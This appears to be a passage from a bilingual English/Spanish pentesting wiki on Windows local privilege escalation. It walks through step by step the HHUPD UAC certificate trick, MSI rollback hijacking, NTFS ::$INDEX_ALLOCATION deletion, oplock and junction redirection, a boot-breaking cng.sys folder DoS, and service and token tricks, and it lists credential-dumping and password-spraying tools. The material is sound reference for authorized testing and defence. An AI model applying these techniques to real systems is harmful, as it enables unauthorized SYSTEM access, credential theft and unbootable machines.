===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Para explotar esta vulnerabilidad, es necesario realizar los siguientes pasos:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
## From Administrator Medium to High Integrity Level / UAC Bypass

Read this to **learn about Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Then **read this to learn about UAC and UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP

The technique described [**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) with a exploit code [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

The attack basically consist of abusing the Windows Installer's rollback feature to replace legitimate files with malicious ones during the uninstallation process. For this the attacker needs to create a **malicious MSI installer** that will be used to hijack the `C:\Config.Msi` folder, which will later be used by he Windows Installer to store rollback files during the uninstallation of other MSI packages where the rollback files would have been modified to contain the malicious payload.

The summarized technique is the following:

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
- Create an `.msi` that installs a harmless file (e.g., `dummy.txt`) in a writable folder (`TARGETDIR`).
- Mark the installer as **"UAC Compliant"**, so a **non-admin user** can run it.
- Keep a **handle** open to the file after install.

- Step 2: Begin Uninstall
- Uninstall the same `.msi`.
- The uninstall process starts moving files to `C:\Config.Msi` and renaming them to `.rbf` files (rollback backups).
- **Poll the open file handle** using `GetFinalPathNameByHandle` to detect when the file becomes `C:\Config.Msi\<random>.rbf`.

- Step 3: Custom Syncing
- The `.msi` includes a **custom uninstall action (`SyncOnRbfWritten`)** that:
- Signals when `.rbf` has been written.
- Then **waits** on another event before continuing the uninstall.

- Step 4: Block Deletion of `.rbf`
- When signaled, **open the `.rbf` file** without `FILE_SHARE_DELETE` — this **prevents it from being deleted**.
- Then **signal back** so the uninstall can finish.
- Windows Installer fails to delete the `.rbf`, and because it can’t delete all contents, **`C:\Config.Msi` is not removed**.

- Step 5: Manually Delete `.rbf`
- You (attacker) delete the `.rbf` file manually.
- Now **`C:\Config.Msi` is empty**, ready to be hijacked.

> At this point, **trigger the SYSTEM-level arbitrary folder delete vulnerability** to delete `C:\Config.Msi`.

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- Recreate the `C:\Config.Msi` folder yourself.
- Set **weak DACLs** (e.g., Everyone:F), and **keep a handle open** with `WRITE_DAC`.

- Step 7: Run Another Install
- Install the `.msi` again, with:
- `TARGETDIR`: Writable location.
- `ERROROUT`: A variable that triggers a forced failure.
- This install will be used to trigger **rollback** again, which reads `.rbs` and `.rbf`.

- Step 8: Monitor for `.rbs`
- Use `ReadDirectoryChangesW` to monitor `C:\Config.Msi` until a new `.rbs` appears.
- Capture its filename.

- Step 9: Sync Before Rollback
- The `.msi` contains a **custom install action (`SyncBeforeRollback`)** that:
- Signals an event when the `.rbs` is created.
- Then **waits** before continuing.

- Step 10: Reapply Weak ACL
- After receiving the `.rbs created` event:
- The Windows Installer **reapplies strong ACLs** to `C:\Config.Msi`.
- But since you still have a handle with `WRITE_DAC`, you can **reapply weak ACLs** again.

> ACLs are **only enforced on handle open**, so you can still write to the folder.

- Step 11: Drop Fake `.rbs` and `.rbf`
- Overwrite the `.rbs` file with a **fake rollback script** that tells Windows to:
- Restore your `.rbf` file (malicious DLL) into a **privileged location** (e.g., `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Drop your fake `.rbf` containing a **malicious SYSTEM-level payload DLL**.

- Step 12: Trigger the Rollback
- Signal the sync event so the installer resumes.
- A **type 19 custom action (`ErrorOut`)** is configured to **intentionally fail the install** at a known point.
- This causes **rollback to begin**.

- Step 13: SYSTEM Installs Your DLL
- Windows Installer:
- Reads your malicious `.rbs`.
- Copies your `.rbf` DLL into the target location.
- You now have your **malicious DLL in a SYSTEM-loaded path**.

- Final Step: Execute SYSTEM Code
- Run a trusted **auto-elevated binary** (e.g., `osk.exe`) that loads the DLL you hijacked.
- **Boom**: Your code is executed **as SYSTEM**.


### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

The main MSI rollback technique (the previous one) assumes you can delete an **entire folder** (e.g., `C:\Config.Msi`). But what if your vulnerability only allows **arbitrary file deletion** ?

You could exploit **NTFS internals**: every folder has a hidden alternate data stream called:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Este stream almacena los **metadatos de índice** de la carpeta.

Por lo tanto, si **eliminas el stream `::$INDEX_ALLOCATION`** de una carpeta, NTFS **elimina toda la carpeta** del sistema de archivos.

Puedes hacer esto usando APIs estándar de eliminación de archivos como:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Aunque estés llamando a una *file delete API*, esta **elimina la carpeta en sí**.

### From Folder Contents Delete to SYSTEM EoP
¿Qué pasa si tu primitiva no te permite eliminar archivos/carpetas arbitrarios, pero **sí permite eliminar el *contenido* de una carpeta controlada por el atacante**?

1. Paso 1: Prepara una carpeta y archivo de cebo
- Crea: `C:\temp\folder1`
- Dentro: `C:\temp\folder1\file1.txt`

2. Paso 2: Coloca un **oplock** en `file1.txt`
- El oplock **pausa la ejecución** cuando un proceso privilegiado intenta eliminar `file1.txt`.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Paso 3: Activar el proceso SYSTEM (p. ej., `SilentCleanup`)
- Este proceso escanea carpetas (p. ej., `%TEMP%`) e intenta eliminar su contenido.
- Cuando llega a `file1.txt`, el **oplock** se activa y transfiere el control a tu callback.

4. Paso 4: Dentro del callback del oplock – redirigir la eliminación

- Opción A: Mover `file1.txt` a otra ubicación
- Esto vacía `folder1` sin romper el oplock.
- No elimines `file1.txt` directamente — eso liberaría el oplock prematuramente.

- Opción B: Convertir `folder1` en una **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Opción C: Crear un **symlink** en `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Esto apunta al NTFS internal stream que almacena los metadatos de la carpeta — al eliminarlo, se elimina la carpeta.

5. Paso 5: Liberar el oplock
- El proceso SYSTEM continúa e intenta eliminar `file1.txt`.
- Pero ahora, debido al junction + symlink, en realidad está eliminando:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Resultado**: `C:\Config.Msi` es eliminado por SYSTEM.

### De crear una carpeta arbitraria a DoS permanente

Explota una primitiva que te permite **crear una carpeta arbitraria como SYSTEM/admin** — incluso si **no puedes escribir archivos** o **establecer permisos débiles**.

Crea una **carpeta** (no un archivo) con el nombre de un **controlador crítico de Windows**, p. ej.:
```
C:\Windows\System32\cng.sys
```
- Esta ruta normalmente corresponde al driver en modo kernel `cng.sys`.
- Si **la pre-creas como una carpeta**, Windows no carga el driver real durante el arranque.
- Entonces, Windows intenta cargar `cng.sys` durante el arranque.
- Ve la carpeta, **no logra resolver el driver real**, y **provoca un fallo o detiene el arranque**.
- No hay **alternativa**, ni **recuperación** sin intervención externa (p. ej., reparación de arranque o acceso al disco).


## **De integridad elevada a SYSTEM**

### **Nuevo servicio**

Si ya estás ejecutando en un proceso de integridad elevada, el **camino a SYSTEM** puede ser tan sencillo como **crear y ejecutar un nuevo servicio**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Cuando crees un binario de servicio asegúrate de que sea un servicio válido o que el binario realice las acciones necesarias lo más rápido posible, ya que será terminado en 20s si no es un servicio válido.

### AlwaysInstallElevated

Desde un proceso de alta integridad podrías intentar **habilitar las entradas de registro AlwaysInstallElevated** e **instalar** una reverse shell usando un wrapper _**.msi**_.\
[Más información sobre las claves del registro involucradas y cómo instalar un paquete _.msi_ aquí.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Puedes** [**encontrar el código aquí**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Si tienes esos privilegios de token (probablemente los encuentres en un proceso que ya sea de alta integridad), podrás **abrir casi cualquier proceso** (no procesos protegidos) con el privilegio SeDebug, **copiar el token** del proceso y crear un **proceso arbitrario con ese token**.\
Usando esta técnica normalmente se **selecciona algún proceso que se ejecute como SYSTEM con todos los privilegios de token** (_sí, puedes encontrar procesos SYSTEM sin todos los privilegios de token_).\
**Puedes encontrar un** [**ejemplo de código que ejecuta la técnica propuesta aquí**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Esta técnica la usa meterpreter para escalar en `getsystem`. La técnica consiste en **crear una pipe y luego crear/abusar un service para escribir en esa pipe**. Entonces, el **server** que creó la pipe usando el privilegio **`SeImpersonate`** podrá **suplantar el token** del cliente de la pipe (el service) obteniendo privilegios SYSTEM.\
Si quieres [**aprender más sobre name pipes deberías leer esto**](#named-pipe-client-impersonation).\
Si quieres leer un ejemplo de [**cómo ir de high integrity a System usando name pipes deberías leer esto**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Si consigues **secuestar una dll** que esté siendo **cargada** por un **process** que se ejecute como **SYSTEM** podrás ejecutar código arbitrario con esos permisos. Por tanto, Dll Hijacking también es útil para este tipo de escalada de privilegios y, además, es mucho **más fácil de lograr desde un high integrity process** ya que tendrá **permisos de escritura** en las carpetas usadas para cargar dlls.\
**Puedes** [**aprender más sobre Dll hijacking aquí**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Leer:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Más ayuda

[Binarios estáticos de impacket](https://github.com/ropnop/impacket_static_binaries)

## Herramientas útiles

**Mejor herramienta para buscar vectores de escalada de privilegios locales en Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Comprueba misconfiguraciones y archivos sensibles (**[**comprueba aquí**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detectado.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Comprueba algunas posibles misconfiguraciones y recopila información (**[**comprueba aquí**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Comprueba misconfiguraciones**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Extrae información de sesiones guardadas de PuTTY, WinSCP, SuperPuTTY, FileZilla y RDP. Usa -Thorough en local.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Extrae credenciales del Credential Manager. Detectado.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Realiza password spray con las contraseñas recopiladas en el dominio**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh es una herramienta PowerShell ADIDNS/LLMNR/mDNS/NBNS spoofer y man-in-the-middle.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Enumeración básica de Windows para privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- Busca vulnerabilidades conocidas de privesc (DEPRECATED para Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Comprobaciones locales **(Necesita privilegios de Admin)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Busca vulnerabilidades conocidas de privesc (necesita compilarse usando VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumera el host buscando misconfiguraciones (más una herramienta de recopilación de información que de privesc) (necesita compilarse) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Extrae credenciales de muchos programas (exe precompilado en github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port de PowerUp a C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- Comprueba misconfiguraciones (ejecutable precompilado en github). No recomendado. No funciona bien en Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Comprueba posibles misconfiguraciones (exe desde python). No recomendado. No funciona bien en Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Herramienta creada basada en este post (no necesita accesschk para funcionar correctamente pero puede usarlo).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Lee la salida de **systeminfo** y recomienda exploits que funcionen (python local)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Lee la salida de **systeminfo** y recomienda exploits que funcionen (python local)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Tienes que compilar el proyecto usando la versión correcta de .NET ([ver esto](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Para ver la versión de .NET instalada en el host víctima puedes hacer:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Referencias

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)

{{#include ../../banners/hacktricks-training.md}}
